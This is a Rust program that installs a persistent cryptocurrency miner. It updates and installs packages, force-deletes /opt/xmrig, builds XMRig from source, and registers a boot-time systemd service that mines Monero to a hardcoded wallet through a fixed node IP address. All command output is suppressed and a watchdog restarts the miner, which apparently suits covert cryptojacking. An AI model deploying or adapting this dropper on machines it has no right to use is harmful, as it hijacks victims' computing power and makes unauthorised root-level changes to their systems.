use std::fs;
use std::path::Path;
use std::process::Stdio;
use std::io::ErrorKind;
use tokio::process::Command;

const WALLET: &str = "4A2wLHnkMELKS4wWtNA6aPcAEpK3ZDPooZnmAW4sViq11JSus46Brngem55keyfKwcKG3udFiHvWjYvt3Y7F9aw629qTsja";
const NODE: &str = "121.98.149.60:18081";

const REPO_URL: &str = "https://github.com/xmrig/xmrig.git";
const INSTALL_DIR: &str = "/opt/xmrig";
const BUILD_DIR: &str = "/opt/xmrig/build";
const BINARY_PATH: &str = "/opt/xmrig/build/xmrig";
const SERVICE_PATH: &str = "/etc/systemd/system/monero_miner.service";

#[tokio::main]
async fn main() {
    let result = full_setup().await;
    if result.is_err() {
        std::process::exit(1);
    }

    if check_and_restart_xmrig().await.is_err() {
        eprintln!("Échec lors de la vérification ou redémarrage de xmrig.");
    }
}

async fn full_setup() -> Result<(), ()> {
    let distro = detect_distro().await?;
    update_system(&distro).await?;
    install_packages(&distro).await?;
    prepare_environment().await?;
    clone_repo().await?;
    create_build_folder().await?;
    build_source().await?;
    confirm_binary().await?;
    create_service_file().await?;
    reload_systemd().await?;
    enable_service().await?;
    start_service().await?;
    Ok(())
}

async fn detect_distro() -> Result<String, ()> {
    if let Ok(content) = fs::read_to_string("/etc/os-release") {
        if content.contains("Alpine") {
            return Ok("alpine".to_string());
        } else if content.contains("Debian") || content.contains("Ubuntu") {
            return Ok("debian".to_string());
        } else if content.contains("Arch") {
            return Ok("arch".to_string());
        } else if content.contains("Fedora") || content.contains("CentOS") {
            return Ok("rhel".to_string());
        }
    }
    Err(())
}

async fn update_system(distro: &str) -> Result<(), ()> {
    match distro {
        "debian" => run("apt-get update").await,
        "alpine" => run("apk update").await,
        "arch" => run("pacman -Sy").await,
        "rhel" => run("yum update -y").await,
        _ => Err(()),
    }
}

async fn install_packages(distro: &str) -> Result<(), ()> {
    match distro {
        "debian" => run("apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev").await,
        "alpine" => run("apk add git build-base cmake libuv-dev openssl-dev hwloc-dev").await,
        "arch" => run("pacman -S --noconfirm git base-devel cmake libuv openssl hwloc").await,
        "rhel" => run("yum install -y git make cmake gcc-c++ libuv-devel openssl-devel hwloc-devel").await,
        _ => Err(()),
    }
}

async fn prepare_environment() -> Result<(), ()> {
    if Path::new(INSTALL_DIR).exists() {
        run(&format!("rm -rf {}", INSTALL_DIR)).await?;
    }
    run(&format!("mkdir -p {}", INSTALL_DIR)).await?;
    Ok(())
}

async fn clone_repo() -> Result<(), ()> {
    run(&format!("git clone {} {}", REPO_URL, INSTALL_DIR)).await
}

async fn create_build_folder() -> Result<(), ()> {
    run(&format!("mkdir -p {}", BUILD_DIR)).await
}

async fn build_source() -> Result<(), ()> {
    run(&format!("cd {} && cmake .. && make -j$(nproc)", BUILD_DIR)).await
}

async fn confirm_binary() -> Result<(), ()> {
    if !Path::new(BINARY_PATH).exists() {
        return Err(());
    }
    Ok(())
}

async fn create_service_file() -> Result<(), ()> {
    let content = format!(
        "[Unit]\nDescription=Monero Miner\nAfter=network.target\n\n[Service]\nExecStart={} -o {} --coin monero -u {} -p x --donate-level=0 --no-color\nRestart=always\nNice=10\nCPUWeight=80\nStandardOutput=journal\nStandardError=journal\n\n[Install]\nWantedBy=multi-user.target\n",
        BINARY_PATH, NODE, WALLET
    );
    match fs::write(SERVICE_PATH, content) {
        Ok(_) => Ok(()),
        Err(e) => match e.kind() {
            ErrorKind::PermissionDenied => Err(()),
            _ => Err(()),
        },
    }
}

async fn reload_systemd() -> Result<(), ()> {
    run("systemctl daemon-reload").await
}

async fn enable_service() -> Result<(), ()> {
    run("systemctl enable monero_miner.service").await
}

async fn start_service() -> Result<(), ()> {
    run("systemctl restart monero_miner.service").await
}

async fn check_and_restart_xmrig() -> Result<(), ()> {
    let status = Command::new("sh")
        .arg("-c")
        .arg("pgrep xmrig")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .await;

    match status {
        Ok(s) if s.success() => {
            println!("xmrig is running.");
            Ok(())
        },
        _ => {
            println!("xmrig is not running. Restarting...");
            run("systemctl restart monero_miner.service").await
        }
    }
}

async fn run(cmd: &str) -> Result<(), ()> {
    let status = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .await;
    match status {
        Ok(s) if s.success() => Ok(()),
        _ => Err(()),
    }
}